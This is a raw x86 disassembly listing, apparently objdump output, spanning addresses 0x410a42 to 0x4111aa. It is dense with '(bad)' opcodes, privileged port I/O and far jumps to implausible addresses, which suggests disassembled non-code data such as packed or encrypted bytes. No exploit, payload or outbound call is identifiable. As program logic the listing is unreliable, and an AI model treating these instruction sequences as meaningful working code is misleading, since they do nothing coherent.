  410a42:	dec    ebx
  410a43:	enter  0x732d,0xdc
  410a47:	cmc    
  410a48:	test   DWORD PTR [esp+ecx*8-0xb42e443],edx
  410a4f:	adc    esp,DWORD PTR [esi]
  410a51:	(bad)  
  410a52:	adc    al,cl
  410a54:	sbb    DWORD PTR [edi+eax*2+0x28],ebp
  410a58:	(bad)  
  410a59:	pushf  
  410a5a:	mov    edx,0x2f999f71
  410a5f:	cmc    
  410a60:	pop    edx
  410a61:	fdivr  st(6),st
  410a63:	sti    
  410a64:	push   ebp
  410a65:	pop    esi
  410a66:	mov    ah,0x26
  410a68:	pop    es
  410a69:	iret   
  410a6a:	sahf   
  410a6b:	jno    0x410a29
  410a6d:	test   DWORD PTR [ebx+0x248be1e8],ebp
  410a73:	jecxz  0x410a06
  410a75:	fimul  DWORD PTR [edx+edi*8-0x20c36866]
  410a7c:	leave  
  410a7d:	mov    bl,0x35
  410a7f:	add    DWORD PTR [eax],0x7d
  410a82:	xchg   DWORD PTR [ecx],esp
  410a84:	sbb    dl,BYTE PTR [edx]
  410a86:	(bad)  
  410a87:	das    
  410a88:	pushf  
  410a89:	inc    eax
  410a8a:	pop    esi
  410a8b:	test   BYTE PTR [edi+0x44],ch
  410a8e:	push   ebx
  410a8f:	pusha  
  410a90:	xor    bl,BYTE PTR [ecx+esi*4]
  410a93:	cmp    DWORD PTR cs:[esi+0x19],0x6f196a5b
  410a9b:	sar    esi,1
  410a9d:	push   eax
  410a9e:	inc    ecx
  410a9f:	cmp    BYTE PTR [esi],ch
  410aa1:	push   edx
  410aa2:	or     al,BYTE PTR [ebx-0x458ca9d1]
  410aa8:	jnp    0x410b0f
  410aaa:	in     eax,dx
  410aab:	sbb    BYTE PTR [ebp+ebx*2+0x14ff2fb],0xcc
  410ab3:	jo     0x410b1e
  410ab5:	mov    al,ds:0xa58c8816
  410aba:	sub    cl,ah
  410abc:	popa   
  410abd:	retf   0xdb6
  410ac0:	rcl    edx,cl
  410ac2:	xor    cl,ch
  410ac4:	cmp    BYTE PTR [ebx],cl
  410ac6:	dec    edx
  410ac7:	push   esp
  410ac8:	push   ds
  410ac9:	jnp    0x410a64
  410acb:	lods   al,BYTE PTR ds:[esi]
  410acc:	add    DWORD PTR [ecx+0x6def28f6],esp
  410ad2:	loop   0x410aac
  410ad4:	adc    al,0x1b
  410ad6:	mov    ebx,0x237b9c09
  410adb:	xchg   ecx,eax
  410adc:	mov    ebx,0x7112387c
  410ae1:	xchg   ecx,eax
  410ae2:	gs dec edi
  410ae4:	pop    ecx
  410ae5:	popa   
  410ae6:	pop    eax
  410ae7:	ins    BYTE PTR es:[edi],dx
  410ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae9:	xlat   BYTE PTR ds:[ebx]
  410aea:	je     0x410b4a
  410aec:	jb     0x410ade
  410aee:	and    edi,esp
  410af0:	lea    ecx,[esi+0x474bae79]
  410af6:	pusha  
  410af7:	push   eax
  410af8:	test   BYTE PTR [esi-0x216d7c31],dh
  410afe:	push   edx
  410aff:	mov    cl,0x28
  410b01:	call   0x3cd6:0xf69c288d
  410b08:	xor    dh,BYTE PTR [ebx]
  410b0a:	mov    al,0x51
  410b0c:	or     al,0xc7
  410b0e:	push   es
  410b0f:	inc    esp
  410b10:	adc    al,0x1a
  410b12:	sub    edx,DWORD PTR [edi]
  410b14:	idiv   DWORD PTR [ebx+edi*1+0x73]
  410b18:	nop
  410b19:	jb     0x410b4a
  410b1b:	lahf   
  410b1c:	xor    eax,edx
  410b1e:	dec    esp
  410b1f:	inc    ebp
  410b20:	pop    edx
  410b21:	iret   
  410b22:	call   0xa6fb:0x5aabc748
  410b29:	or     ch,BYTE PTR [ebx+0x59daa88c]
  410b2f:	fstp   TBYTE PTR [edx+0x0]
  410b32:	out    0x22,eax
  410b34:	mov    ah,0xa4
  410b36:	stos   DWORD PTR es:[edi],eax
  410b37:	and    eax,0xbde2b4fb
  410b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b3d:	add    eax,0x58bbafc5
  410b42:	push   es
  410b43:	mov    ch,0x13
  410b45:	test   DWORD PTR [ebx],eax
  410b47:	and    edx,DWORD PTR [esi]
  410b49:	mov    ah,0x32
  410b4b:	jns    0x410b86
  410b4d:	sub    eax,0x4b658ab5
  410b52:	mov    edx,0x804a066
  410b57:	push   es
  410b58:	adc    al,dh
  410b5a:	test   ch,ch
  410b5c:	dec    edx
  410b5d:	scas   al,BYTE PTR es:[edi]
  410b5e:	lods   al,BYTE PTR ds:[esi]
  410b5f:	ret    
  410b60:	pop    edx
  410b61:	mov    ebp,0x6a814702
  410b66:	ja     0x410b6a
  410b68:	stos   BYTE PTR es:[edi],al
  410b69:	and    dh,dh
  410b6b:	mov    ecx,0x5b2a5ceb
  410b70:	imul   esi,edi,0x76aa7947
  410b76:	mov    al,ds:0xce4b3ffd
  410b7b:	add    BYTE PTR [edi],0x8e
  410b7e:	lods   al,BYTE PTR ds:[esi]
  410b7f:	sbb    ah,BYTE PTR [eax-0x29]
  410b82:	in     eax,dx
  410b83:	push   esp
  410b84:	pop    ss
  410b85:	xchg   ecx,eax
  410b86:	or     eax,0x31e98592
  410b8b:	inc    esp
  410b8c:	push   esi
  410b8d:	popa   
  410b8e:	pusha  
  410b8f:	and    DWORD PTR ds:0xe3a22224,eax
  410b95:	daa    
  410b96:	sbb    DWORD PTR [ecx+ebx*1+0x56],edi
  410b9a:	mov    esp,0x94e16764
  410b9f:	cmp    eax,ecx
  410ba1:	inc    ebp
  410ba2:	add    al,0x4f
  410ba4:	sbb    al,0xa8
  410ba6:	or     al,0x64
  410ba8:	test   eax,0x480ab52
  410bad:	xor    BYTE PTR [eax+0x6a],0x9b
  410bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bb2:	test   eax,0x58d18900
  410bb7:	sub    al,0xcf
  410bb9:	inc    edi
  410bba:	loop   0x410bfb
  410bbc:	pop    esp
  410bbd:	in     al,dx
  410bbe:	in     al,0x17
  410bc0:	jge    0x410b6b
  410bc2:	mov    eax,ds:0x8325a955
  410bc7:	test   DWORD PTR [ebx+ecx*1+0x7e],esp
  410bcb:	pop    edx
  410bcc:	out    0xd3,al
  410bce:	pop    ss
  410bcf:	(bad)  
  410bd0:	push   eax
  410bd1:	sti    
  410bd2:	sub    al,BYTE PTR [ecx]
  410bd4:	inc    edi
  410bd5:	hlt    
  410bd6:	or     DWORD PTR [eax],edi
  410bd8:	add    al,dh
  410bda:	in     al,0xf9
  410bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bdd:	sti    
  410bde:	mov    BYTE PTR [ecx],ah
  410be0:	pusha  
  410be1:	cmp    al,0xab
  410be3:	mov    bh,0xa3
  410be5:	jp     0x410bcc
  410be7:	(bad)  
  410be8:	push   cs
  410be9:	mov    dh,0x30
  410beb:	ja     0x410bec
  410bed:	add    bl,bl
  410bef:	ret    
  410bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf1:	mov    dl,0xbc
  410bf3:	fwait
  410bf4:	dec    ecx
  410bf5:	call   0x56bde5ee
  410bfa:	imul   esp,DWORD PTR [ebp+0x4b],0x3a
  410bfe:	sti    
  410bff:	mov    BYTE PTR [ebp-0x3b],dl
  410c02:	pop    edi
  410c03:	int    0xee
  410c05:	jb     0x410bba
  410c07:	outs   dx,BYTE PTR ds:[esi]
  410c08:	dec    esi
  410c09:	addr16 inc ax
  410c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c0d:	popf   
  410c0e:	mov    esp,0xd3731693
  410c13:	and    DWORD PTR [eax+0x67],ebx
  410c16:	mov    al,ds:0xe85d0dfc
  410c1b:	jb     0x410c6e
  410c1d:	sbb    ch,ah
  410c1f:	dec    edi
  410c20:	add    eax,0xb85e33e3
  410c25:	xor    esp,DWORD PTR [edi+0xc13a094]
  410c2b:	scas   al,BYTE PTR es:[edi]
  410c2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c2d:	sub    dh,BYTE PTR [eax+eiz*8+0x6]
  410c31:	or     DWORD PTR [ebx],0x6d8beffa
  410c37:	dec    eax
  410c38:	nop
  410c39:	sbb    BYTE PTR [eax+0x35152f4c],dl
  410c3f:	cmp    ah,cl
  410c41:	imul   eax,DWORD PTR [ecx+0x3323c487],0xb9f04ef4
  410c4b:	retf   0x8249
  410c4e:	inc    ebp
  410c4f:	jmp    0xec61:0x293b7eca
  410c56:	or     eax,ebx
  410c58:	data16 (bad) 
  410c5a:	outs   dx,DWORD PTR ds:[esi]
  410c5b:	add    BYTE PTR [ecx-0x15],bl
  410c5e:	pop    es
  410c5f:	xor    al,0x25
  410c61:	js     0x410cad
  410c63:	popf   
  410c64:	out    dx,eax
  410c65:	cs mov ah,0xd6
  410c68:	std    
  410c69:	leave  
  410c6a:	mov    eax,0xe53d5a2
  410c6f:	adc    al,0xec
  410c71:	cmp    al,0x9
  410c73:	lea    esi,[eax-0x10]
  410c76:	lds    edi,FWORD PTR [edi+edi*1+0x7]
  410c7a:	pop    ebp
  410c7b:	sahf   
  410c7c:	sub    eax,0x6d3985b8
  410c81:	outs   dx,DWORD PTR ds:[esi]
  410c82:	push   esi
  410c83:	xchg   esi,eax
  410c84:	int3   
  410c85:	jp     0x410c8f
  410c87:	cmp    eax,0x61c8454a
  410c8c:	frstor [ecx+0x5102bfdd]
  410c92:	pop    es
  410c93:	sar    BYTE PTR [edx+0x28],cl
  410c96:	mov    dl,0xe9
  410c98:	fimul  WORD PTR [esp+esi*8-0x55]
  410c9c:	push   edi
  410c9d:	push   0xeb81fb5a
  410ca2:	pop    edi
  410ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ca4:	inc    edx
  410ca5:	sub    DWORD PTR [ecx],0x81bda640
  410cab:	pop    ss
  410cac:	out    0x4,al
  410cae:	stos   BYTE PTR es:[edi],al
  410caf:	lock int 0x50
  410cb2:	pusha  
  410cb3:	out    0x91,eax
  410cb5:	jne    0x410c9b
  410cb7:	clc    
  410cb8:	fldenv [ecx+0xa]
  410cbb:	push   0x6bc20e19
  410cc0:	test   DWORD PTR [edx+0x507f1a6],eax
  410cc6:	es (bad) 
  410cca:	mov    ecx,0x426cb155
  410ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd0:	mov    WORD PTR [edi+edi*1+0x67],fs
  410cd4:	jae    0x410d4e
  410cd6:	cmp    BYTE PTR [ecx+0x42],dh
  410cd9:	cmp    ebp,ebx
  410cdb:	into   
  410cdc:	pop    esp
  410cdd:	mov    bh,0x6f
  410cdf:	in     al,dx
  410ce0:	push   ebx
  410ce1:	out    dx,al
  410ce2:	sbb    DWORD PTR [ecx+ebp*1-0x2f],0x1c
  410ce7:	sbb    BYTE PTR [ecx],dl
  410ce9:	fisubr WORD PTR ds:0x41f13ad8
  410cef:	add    al,0x77
  410cf1:	sbb    dh,BYTE PTR [ebx-0x19]
  410cf4:	add    eax,0x8dbba3e9
  410cf9:	pop    ebx
  410cfa:	neg    esi
  410cfc:	mov    esp,0xf13f4e9e
  410d01:	or     BYTE PTR [eax-0x7b],al
  410d04:	xchg   edx,eax
  410d05:	fdiv   QWORD PTR [edi-0x43eff6f9]
  410d0b:	jmp    0x3840:0x3f10463
  410d12:	or     eax,0x2add32f0
  410d17:	out    0x25,al
  410d19:	pop    ss
  410d1a:	xchg   edi,eax
  410d1b:	dec    edi
  410d1c:	arpl   WORD PTR [ecx],di
  410d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d1f:	data16 syscall 
  410d22:	dec    esp
  410d23:	mov    ss,ebx
  410d25:	ss stos BYTE PTR es:[edi],al
  410d27:	cli    
  410d28:	dec    edi
  410d29:	ds ds (bad) 
  410d2c:	ds sti 
  410d2e:	xchg   ebx,eax
  410d2f:	mov    ds:0xda63923d,eax
  410d34:	dec    cl
  410d36:	ret    
  410d37:	sub    dh,BYTE PTR [ebx+0x33]
  410d3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d3b:	sub    al,0x98
  410d3d:	mov    edi,0xdc7ecdea
  410d42:	inc    esp
  410d43:	lods   al,BYTE PTR ds:[esi]
  410d44:	popa   
  410d45:	in     eax,0x1e
  410d47:	repz icebp 
  410d49:	push   0x5a
  410d4b:	adc    ch,BYTE PTR [ebx-0x7314974d]
  410d51:	jp     0x410dba
  410d53:	ror    cl,0x7f
  410d56:	imul   edi,DWORD PTR [edi],0xffffffc9
  410d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d5a:	pusha  
  410d5b:	inc    edi
  410d5c:	jo     0x410daf
  410d5e:	sbb    al,0x92
  410d60:	sbb    ecx,edx
  410d62:	sbb    eax,0xae369da8
  410d67:	xchg   esi,eax
  410d68:	retf   0x4b0
  410d6b:	and    eax,esi
  410d6d:	adc    ecx,DWORD PTR [esi-0x61]
  410d70:	mov    BYTE PTR [ecx+0x3ca74124],al
  410d76:	jl     0x410da5
  410d78:	pop    ebp
  410d79:	inc    edi
  410d7a:	aad    0xc1
  410d7c:	xor    ebx,DWORD PTR [edi+0x39627e3d]
  410d82:	jae    0x410d23
  410d84:	div    al
  410d86:	in     eax,0xc7
  410d88:	shr    esi,0x95
  410d8b:	fwait
  410d8c:	sub    dl,dh
  410d8e:	stos   BYTE PTR es:[edi],al
  410d8f:	push   esp
  410d90:	mov    esi,0x5b714cbf
  410d95:	pop    esi
  410d96:	inc    ebp
  410d97:	xchg   ebp,eax
  410d98:	enter  0xc89c,0x8b
  410d9c:	sub    eax,0x21652a6f
  410da1:	retf   
  410da2:	js     0x410d81
  410da4:	icebp  
  410da5:	leave  
  410da6:	retf   
  410da7:	dec    esp
  410da8:	add    al,BYTE PTR [eax-0x33]
  410dab:	jl     0x410d9e
  410dad:	das    
  410dae:	xchg   BYTE PTR [ebx+eiz*1],cl
  410db1:	mov    edx,0x8cc415d6
  410db6:	fidiv  DWORD PTR [ebx+0x28]
  410db9:	and    bl,BYTE PTR [esi]
  410dbb:	pop    edx
  410dbc:	rol    DWORD PTR [ebx-0x26a2db55],cl
  410dc2:	(bad)  
  410dc4:	ror    DWORD PTR ds:0x1a28912d,1
  410dca:	xor    al,0x3b
  410dcc:	mov    ch,BYTE PTR [esi-0x62067c26]
  410dd2:	lods   eax,DWORD PTR ds:[esi]
  410dd3:	mov    al,ds:0x8a3c378d
  410dd8:	mov    DWORD PTR ds:0xe463a3dc,eax
  410dde:	inc    eax
  410ddf:	rol    cl,1
  410de1:	and    DWORD PTR [ecx-0x68],esi
  410de4:	sub    ebx,esp
  410de6:	test   al,0x29
  410de8:	xchg   ebp,eax
  410de9:	jl     0x410e40
  410deb:	rcl    DWORD PTR [edx],0xfe
  410dee:	cmp    DWORD PTR [esp+eax*8-0x17],0x2b9f8f97
  410df6:	fwait
  410df7:	stc    
  410df8:	push   ss
  410df9:	cmp    al,0xc3
  410dfb:	ret    
  410dfc:	test   eax,0xc540b5a8
  410e01:	ss icebp 
  410e03:	(bad)  
  410e04:	cli    
  410e05:	aad    0xaa
  410e07:	push   ds
  410e08:	add    al,0xfb
  410e0a:	bnd ja 0x410dac
  410e0d:	adc    ecx,DWORD PTR [esi]
  410e0f:	inc    ebp
  410e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e11:	pop    edi
  410e12:	cwde   
  410e13:	les    edi,FWORD PTR [ecx-0x36]
  410e16:	mov    eax,DWORD PTR [eax]
  410e18:	cmp    BYTE PTR [edi],bl
  410e1a:	dec    esp
  410e1b:	popf   
  410e1c:	jae    0x410e4d
  410e1e:	out    0xa4,al
  410e20:	add    edx,0x66
  410e23:	xchg   edx,eax
  410e24:	jg     0x410de6
  410e26:	jg     0x410dde
  410e28:	push   ebx
  410e2a:	mov    edi,0x19069252
  410e2f:	xchg   esi,eax
  410e30:	fld    TBYTE PTR [edx-0x624e7eab]
  410e36:	rol    BYTE PTR [ebp-0x53],0x1a
  410e3a:	in     eax,0xd6
  410e3c:	(bad)  
  410e3d:	mov    ebx,0xdb1d6905
  410e42:	ins    BYTE PTR es:[edi],dx
  410e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e44:	aas    
  410e45:	pop    ebp
  410e46:	out    0x67,eax
  410e48:	ins    BYTE PTR es:[edi],dx
  410e49:	sbb    eax,0xce1db63e
  410e4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e4f:	ins    BYTE PTR es:[edi],dx
  410e50:	(bad)  
  410e51:	loope  0x410eb6
  410e53:	call   0x37cc:0xeb58d8f7
  410e5a:	jecxz  0x410e4d
  410e5c:	imul   esi,ebp,0x17
  410e5f:	jp     0x410e8b
  410e61:	xchg   ecx,eax
  410e62:	push   edx
  410e63:	ja     0x410dff
  410e65:	dec    ebp
  410e66:	mov    BYTE PTR [ecx+0x73],dh
  410e69:	ret    0xc50
  410e6c:	adc    al,0x73
  410e6e:	arpl   WORD PTR [edi],dx
  410e70:	outs   dx,DWORD PTR ds:[esi]
  410e71:	and    BYTE PTR [edi+0x1e3816e9],0x9
  410e78:	and    al,0xaa
  410e7a:	cmp    edi,eax
  410e7c:	outs   dx,BYTE PTR ds:[esi]
  410e7d:	dec    edx
  410e7e:	fbstp  TBYTE PTR [ecx]
  410e80:	ins    BYTE PTR es:[edi],dx
  410e81:	test   eax,0x2ae5f44e
  410e86:	sub    al,0x64
  410e88:	inc    ebp
  410e89:	mov    ch,0x85
  410e8b:	jmp    0x70c3:0x8e4d2534
  410e92:	lock cmp DWORD PTR [ebx+0x1482e436],0xcae8836
  410e9d:	leave  
  410e9e:	add    eax,DWORD PTR [edx+0x3e8535f4]
  410ea4:	(bad)  
  410ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ea6:	inc    esp
  410ea7:	xlat   BYTE PTR ds:[ebx]
  410ea8:	jb     0x410f21
  410eaa:	ja     0x410eef
  410eac:	pop    ecx
  410ead:	or     BYTE PTR [esi-0x145e6d12],0x61
  410eb4:	xor    DWORD PTR [eax-0x27ae4aba],0x58c5522f
  410ebe:	push   ds
  410ebf:	xchg   BYTE PTR ds:0x3d611051,dl
  410ec5:	sub    esi,DWORD PTR [ebx+ebx*1-0x33]
  410ec9:	or     al,BYTE PTR [edi-0x70ca462b]
  410ecf:	push   esp
  410ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ed1:	pusha  
  410ed2:	inc    esp
  410ed3:	mov    esi,0x7aaa76c3
  410ed8:	and    dh,BYTE PTR [ecx-0x59]
  410edb:	cmp    ecx,DWORD PTR [ebx+0x2dd09fb]
  410ee1:	jbe    0x410f0f
  410ee3:	fucom  st(0)
  410ee5:	cmc    
  410ee6:	clc    
  410ee7:	popf   
  410ee8:	mov    ds:0x3a67893d,eax
  410eed:	ror    BYTE PTR [edi+0x2c],1
  410ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ef1:	jg     0x410ee5
  410ef3:	xchg   ebp,eax
  410ef4:	mov    eax,ds:0x8324e06f
  410ef9:	mov    ds:0x9aeaebbf,al
  410efe:	xor    ebx,edx
  410f00:	lss    ecx,FWORD PTR [edi+0x4ca94a56]
  410f07:	icebp  
  410f08:	or     ebp,edi
  410f0a:	mov    ecx,0x58359be0
  410f0f:	clc    
  410f10:	dec    eax
  410f11:	jl     0x410e97
  410f13:	test   BYTE PTR [eax-0x156af4ec],bh
  410f19:	adc    DWORD PTR [edx+0x11d9e7c0],ecx
  410f1f:	jae    0x410ed7
  410f21:	adc    dh,BYTE PTR [ebp+0x6fa84705]
  410f27:	push   ecx
  410f28:	loopne 0x410f54
  410f2a:	loop   0x410f02
  410f2c:	scas   al,BYTE PTR es:[edi]
  410f2d:	or     eax,0x9edb8b01
  410f32:	push   edx
  410f33:	shl    DWORD PTR [esi+edx*1-0x67],cl
  410f37:	test   DWORD PTR [ebx-0x58f1820a],0xce773b56
  410f41:	fisttp DWORD PTR [edx-0x1189e41f]
  410f47:	sub    edi,edi
  410f49:	out    dx,eax
  410f4a:	or     eax,0x767ccbae
  410f4f:	and    ebp,DWORD PTR [eax]
  410f51:	sahf   
  410f52:	ret    
  410f53:	aam    0x6d
  410f55:	in     al,dx
  410f56:	mov    ah,0x9c
  410f58:	mov    ds:0xd1cbbdb0,eax
  410f5d:	jecxz  0x410f0f
  410f5f:	adc    eax,0xd5566250
  410f64:	in     eax,dx
  410f65:	jmp    0x462f1ca8
  410f6a:	fbstp  TBYTE PTR [ebx-0x10d4c231]
  410f70:	dec    edi
  410f71:	mov    dh,0x19
  410f73:	neg    bh
  410f75:	test   DWORD PTR [edi+esi*1],edi
  410f78:	or     ch,BYTE PTR [edx+ebp*4]
  410f7b:	sub    ebp,esi
  410f7d:	or     bh,bh
  410f7f:	js     0x410fb9
  410f81:	iret   
  410f82:	mov    edx,0xe6f83f91
  410f87:	jb     0x410fcc
  410f89:	inc    esp
  410f8a:	sbb    al,0x1a
  410f8c:	sar    BYTE PTR [ebx],0x79
  410f8f:	inc    eax
  410f90:	mov    DWORD PTR [eax],ecx
  410f92:	out    0x1d,eax
  410f94:	in     al,dx
  410f95:	jne    0x410f68
  410f97:	cld    
  410f98:	xor    al,0xce
  410f9a:	jl     0x410fea
  410f9c:	sbb    cl,BYTE PTR [ebx+edx*4-0x35]
  410fa0:	in     al,dx
  410fa1:	xchg   ebp,eax
  410fa2:	push   esp
  410fa3:	test   esp,esi
  410fa5:	clc    
  410fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fa7:	push   ds
  410fa8:	aam    0x84
  410faa:	cmp    al,0xec
  410fac:	stos   DWORD PTR es:[edi],eax
  410fad:	mov    ebx,0xb2c06161
  410fb2:	pop    es
  410fb3:	fcmovb st,st(0)
  410fb5:	xchg   ebp,eax
  410fb6:	xchg   ecx,eax
  410fb7:	arpl   WORD PTR [ebp-0x15f51995],di
  410fbd:	cvtpi2ps xmm3,mm2
  410fc0:	mov    ecx,0x4d839fc3
  410fc5:	xchg   ebx,eax
  410fc6:	test   BYTE PTR [eax+0x4d],ch
  410fc9:	mov    ecx,0x287edf65
  410fce:	ins    DWORD PTR es:[edi],dx
  410fcf:	add    eax,0xfceea2d0
  410fd4:	and    ebx,DWORD PTR [ecx-0x16d7e2cf]
  410fda:	mov    bh,0x1b
  410fdc:	out    0xe5,al
  410fde:	daa    
  410fdf:	ret    
  410fe0:	push   ds
  410fe1:	inc    ecx
  410fe2:	add    BYTE PTR [esi],0x7d
  410fe5:	ret    
  410fe6:	dec    ebp
  410fe7:	add    cl,BYTE PTR [ecx+0x20d4955b]
  410fed:	inc    edx
  410fee:	or     cl,ch
  410ff0:	aad    0x8d
  410ff2:	fs cmp al,0xd
  410ff5:	jb     0x411002
  410ff7:	mov    WORD PTR [ecx+0x7c],ss
  410ffa:	sbb    eax,0xdd6751b5
  410fff:	pusha  
  411000:	push   ss
  411001:	daa    
  411002:	sbb    eax,0xd0e469cd
  411007:	mov    esp,0xb411c3bf
  41100c:	(bad)  
  41100d:	dec    ebp
  41100e:	jae    0x41107d
  411010:	or     dl,al
  411012:	fs jg  0x411081
  411015:	jmp    0x4a6ce83f
  41101a:	ret    
  41101b:	iret   
  41101c:	pop    esi
  41101d:	jp     0x41106a
  41101f:	and    esp,eax
  411021:	and    eax,0x36a9a6c2
  411026:	sbb    al,0x13
  411028:	sub    bl,cl
  41102a:	lock out dx,eax
  41102c:	add    DWORD PTR [esi],ebp
  41102e:	xor    al,0xc7
  411030:	xor    esi,0x441ebdd0
  411036:	test   eax,0x320ccb0c
  41103b:	dec    ecx
  41103c:	js     0x411024
  41103e:	jae    0x410ffc
  411040:	scas   al,BYTE PTR es:[edi]
  411041:	cmp    BYTE PTR [ecx],cl
  411043:	inc    ebp
  411044:	rol    BYTE PTR [eax-0x56],1
  411047:	mov    ds:0x3f73ac25,al
  41104c:	xchg   edx,eax
  41104d:	push   esi
  41104e:	push   0xffffffa2
  411050:	sub    eax,DWORD PTR [edx]
  411052:	(bad)  
  411053:	stos   DWORD PTR es:[edi],eax
  411054:	xor    al,0x79
  411056:	adc    al,0xfb
  411058:	mov    ch,0xf3
  41105a:	mov    edi,DWORD PTR [edi]
  41105c:	sahf   
  41105d:	push   eax
  41105e:	push   eax
  41105f:	loope  0x41109c
  411061:	add    esi,DWORD PTR [ebx]
  411063:	sub    dh,dh
  411065:	fnstcw WORD PTR [eax]
  411067:	out    0xfa,al
  411069:	mov    esp,0x9530d269
  41106e:	scas   eax,DWORD PTR es:[edi]
  41106f:	and    DWORD PTR [ebx+ebx*2-0x57],0x344d6771
  411077:	shl    BYTE PTR [esi+0x6b],1
  41107a:	jge    0x41104a
  41107c:	jbe    0x411056
  41107e:	jl     0x4110b9
  411080:	pop    edi
  411081:	inc    esi
  411082:	push   ss
  411083:	adc    DWORD PTR [ecx],edx
  411085:	clc    
  411086:	comiss xmm7,DWORD PTR [edi]
  411089:	aas    
  41108a:	call   0x293f:0x92fdbbb6
  411091:	leave  
  411092:	inc    edx
  411093:	sbb    bh,BYTE PTR [esi]
  411095:	outs   dx,DWORD PTR ds:[esi]
  411096:	into   
  411097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411098:	add    al,0xc6
  41109a:	test   DWORD PTR [eax],edx
  41109c:	mov    esi,0x9b5ffb39
  4110a1:	aad    0xec
  4110a3:	call   0xd31c57ab
  4110a8:	repz mov ds:0xf9150658,al
  4110ae:	mov    esi,0x9ff4aa3c
  4110b3:	pop    ss
  4110b4:	mov    ebx,0x1934ca06
  4110b9:	hlt    
  4110ba:	ja     0x411093
  4110bc:	and    al,0x35
  4110be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110bf:	jb     0x411124
  4110c1:	push   esi
  4110c2:	in     eax,dx
  4110c3:	push   ecx
  4110c4:	dec    ebx
  4110c5:	inc    esp
  4110c6:	push   cs
  4110c7:	jbe    0x41112a
  4110c9:	and    dl,ch
  4110cb:	and    ah,dl
  4110cd:	sub    edx,esi
  4110cf:	and    esp,DWORD PTR [ecx]
  4110d1:	mov    WORD PTR [esi],?
  4110d3:	cmp    BYTE PTR [ecx-0x50],0x21
  4110d7:	inc    ebx
  4110d8:	mov    ds:0xed2fbcf8,eax
  4110dd:	push   es
  4110de:	jns    0x4110f5
  4110e0:	in     eax,dx
  4110e1:	inc    eax
  4110e2:	jecxz  0x411076
  4110e4:	pop    ebx
  4110e5:	lods   eax,DWORD PTR ds:[esi]
  4110e6:	jae    0x4110e8
  4110e8:	push   ecx
  4110e9:	stos   DWORD PTR es:[edi],eax
  4110ea:	test   al,0xeb
  4110ec:	icebp  
  4110ed:	sub    eax,0xb39602ed
  4110f2:	and    esi,DWORD PTR [edx]
  4110f4:	jae    0x41108e
  4110f6:	mov    cl,0xeb
  4110f8:	cmp    eax,0x63cb61ab
  4110fd:	mov    ecx,0x6a173632
  411102:	or     BYTE PTR [edx+0x8be14e8],dl
  411108:	nop
  411109:	xchg   BYTE PTR [esi],dh
  41110b:	dec    ecx
  41110c:	sar    esi,cl
  41110e:	xor    BYTE PTR [ecx+0x46],cl
  411111:	xchg   esi,eax
  411112:	jne    0x4110f4
  411114:	xchg   esp,eax
  411115:	ins    DWORD PTR es:[edi],dx
  411116:	add    BYTE PTR [ebp-0x69],ah
  411119:	and    DWORD PTR [ecx],0xffffffa1
  41111c:	jge    0x4110f1
  41111e:	push   eax
  41111f:	lods   al,BYTE PTR ds:[esi]
  411120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411121:	loope  0x41112c
  411123:	cmp    esi,ecx
  411125:	xor    esp,ebx
  411127:	pop    eax
  411128:	xchg   DWORD PTR [edi+0x36d1b65],ecx
  41112e:	nop
  41112f:	jb     0x41115c
  411131:	inc    ebp
  411132:	sbb    ebx,DWORD PTR [eax+edx*8]
  411135:	mov    dh,0x1e
  411137:	jp     0x411178
  411139:	aad    0x3
  41113b:	std    
  41113c:	sub    DWORD PTR [eax],ecx
  41113e:	jecxz  0x4110f2
  411140:	mov    bl,BYTE PTR [ebx-0x3]
  411143:	sbb    edi,DWORD PTR [esi+0x2f]
  411146:	(bad)  
  411147:	push   ecx
  411148:	je     0x4110dc
  41114a:	jmp    FWORD PTR [eax+ecx*2-0x34]
  41114e:	ret    0x5f22
  411151:	xchg   ecx,eax
  411152:	neg    DWORD PTR [edi]
  411154:	push   esp
  411155:	inc    esi
  411156:	mov    gs,WORD PTR [esi+0x535f42b7]
  41115c:	enter  0x5e07,0xb9
  411160:	ret    0x7e66
  411163:	rol    DWORD PTR [ebx],1
  411165:	pop    eax
  411166:	pop    es
  411167:	ss jnp 0x411103
  41116a:	rol    DWORD PTR [ebp+ebx*2-0x63223710],0x8
  411172:	adc    DWORD PTR [ebx+0x50],eax
  411175:	lds    sp,DWORD PTR [eax]
  411178:	push   esp
  411179:	cmp    esi,DWORD PTR [esi-0x420ed393]
  41117f:	retf   0x4288
  411182:	pop    es
  411183:	mov    ds,WORD PTR [edx]
  411185:	mov    WORD PTR [edi],cs
  411187:	enter  0xc94c,0x98
  41118b:	stos   BYTE PTR es:[edi],al
  41118c:	mov    esi,0x559f485b
  411191:	test   bh,dh
  411193:	ins    BYTE PTR es:[edi],dx
  411194:	mov    bl,0x25
  411196:	out    0x47,al
  411198:	or     dl,BYTE PTR [ecx+0x7]
  41119b:	adc    edi,edx
  41119d:	or     edx,ecx
  41119f:	loopne 0x411170
  4111a1:	or     dh,0xc6
  4111a4:	add    ah,BYTE PTR [edi+0x27]
  4111a7:	xor    dh,ah
  4111a9:	cli    
  4111aa:	pop    eax
